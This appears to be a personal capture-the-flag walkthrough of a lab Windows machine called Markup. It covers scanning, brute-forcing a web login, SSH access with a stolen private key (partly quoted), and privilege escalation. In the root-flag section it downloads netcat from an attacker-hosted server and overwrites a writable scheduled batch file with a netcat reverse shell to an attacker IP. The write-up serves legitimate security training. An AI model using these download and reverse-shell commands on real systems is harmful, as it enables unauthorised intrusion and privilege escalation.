>[!tldr] Markup is a very easy Windows machine that explores XML External Entity ( #XXE ) vulnerabilities, insecure file permissions and misconfigured scheduled tasks. A vulnerable web application allows for user-supplied XML input to be parsed allowing the retrieval of sensitive files on the host machine, including the user's private SSH key. Privilege escalation can be achieved by identifying and overwriting a scheduled batch script with insecure permissions to execute a reverse shell.

# Guided Mode
---
1. `What version of Apache is running on the target's port 80?`
	1. We will use `nmap` to scan port 80
```shell
nmap -sCV -p80 10.129.114.250
<SNIP>
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-title: MegaShopping
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
```
- Flag #1 -> `2.4.41`

---
2. `What username:password combination logs in successfully?`
	1. (Paraphrasing the hint) We need to brute force the login, i'll try with `Zap`
		1. `admin`: FILE->`~/Tools/SecLists-2026.1/Passwords/Leaked-Databases/rockyou-75.txt`
		2. Found the credentials: `admin`:`password`
- Flag #2 -> `admin`:`password`

---
3. `What is the word at the top of the page that accepts user input?`
	1. Just looking around the tabs, 2 sections accept input, "`order`" and "Contact"
- Flag #3 -> `order`

---
4. `What XML version is used on the target?`
	1. I pressed `Ctrl + U` to get the source page and the filtered (`Ctrl + F`) by "XML". After a few findings I found the version.
- Flag #4 -> `1.0`

---
5. `What does the XXE / XEE attack acronym stand for?`
	1. Found by searching it up
- Flag #5 -> `XML External Entity`

---
6. `What username can we find on the webpage's HTML code?`
	1. Inside the source code we see who modified the code recently, meaning that its a possible username and it was
		1. `view-source:https://10.129.141.231/services.php` -> `<!-- Modified by Daniel : UI-Fix-9092-->` -> `Daniel`
- Flag #6 -> `Daniel`

---
7. `What is the file located in the Log-Management folder on the target?`
	1. Create a new `id_rsa` file
		1. `sudo nano id_rsa`
	2. Next, place the contents from the **stolen-id_rsa** key inside the `id_rsa` you created
	```shell
	-----BEGIN OPENSSH PRIVATE KEY-----
		<SNIP>
	m3MVFR4sN7a1cAAAANZGFuaWVsQEVudGl0eQECAwQFBg==
	-----END OPENSSH PRIVATE KEY-----
	```
	3. Give proper permissions to the file
		1. `sudo chmod 400 id_rsa`
	4. Use the key!
		1. `sudo ssh -i id_rsa user@{target-ip}` 
	5. Now that we have access we can go to the windows "root" `C:\` and here we notice the directory `Log-Management`. Inside is `job.bat` which is the flag
- Flag #7 -> `job.bat`

---
8. `What executable is mentioned in the file mentioned before?`
	1. Doing a quick `type job.bat` catonates its insides and we see `wevtutil.exe` is mentioned.
- Flag #8 -> `wevtutil.exe`

----
- User Flag
	1. Inside Daniel's Desktop is the `user.txt`
- User Flag -> `[REDACTED_FLAG]`

---
- Root Flag 
	- I tried `winPEAS.exe` on the target to no avail.
	- I then followed the walk through after several failed attempts:
```powershell
daniel@MARKUP C:\Users\daniel>icacls C:\Log-Management\job.bat
C:\Log-Management\job.bat BUILTIN\Users:(F)
                          NT AUTHORITY\SYSTEM:(I)(F)
                          BUILTIN\Administrators:(I)(F)
                          BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```
- F = Full access permission! We can use this to boost priviliges of a process!

1. First i downloaded `nc64.exe` from https://github.com/rahuldottech/netcat-for-windows/releases
2. Next, on the attacker machine (mine) I started a python http server for the victim to download from
	- `python -m http.server 8888` 
	- Make sure the server is started from the directory which downloaded `nc64.exe`
3.  Then, from the victims machine i used `curl` to downloaded the file
	1. `curl -o winpeas.exe http://{attacker-ip}:8888/nc64.exe`
4. Back on the attacker machine lets start a listener
	1. `sudo nc -lvnp 888`
5. We then use the following one-liner to modify `job.bat`
	1. `echo C:\Log-Management\nc64.exe -e cmd.exe <ATTACKER_IP> 888 > C:\Log-Management\job.bat`
6. Then we can use the following one-liner to read the `root.txt` (We do this because the reverse shell is very slow)
	1. `type C:\Users\Administrator\Desktop\root.txt`
- Root Flag -> `[REDACTED_FLAG]`